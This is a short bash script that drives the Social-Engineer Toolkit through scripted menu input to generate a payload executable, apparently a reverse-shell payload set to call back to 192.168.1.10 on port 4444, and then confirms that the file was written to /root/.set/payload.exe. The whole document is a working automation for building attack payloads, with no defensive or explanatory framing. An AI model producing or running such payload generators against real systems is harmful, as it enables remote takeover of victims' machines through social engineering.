#!/bin/bash

PAYLOAD_PATH="/root/.set/payload.exe"

echo "[*] Generating payload..."

{
    sleep 2
    printf "y\n1\n4\n2\n192.168.1.10\n4444\nyes\n"
} | sudo setoolkit > /dev/null 2>&1

# Wait for payload to be written
sleep 25

# Verify
if [ -f "$PAYLOAD_PATH" ]; then
    echo "SET Payload generated successfully"
else
    echo "Error: Payload not found"
fi
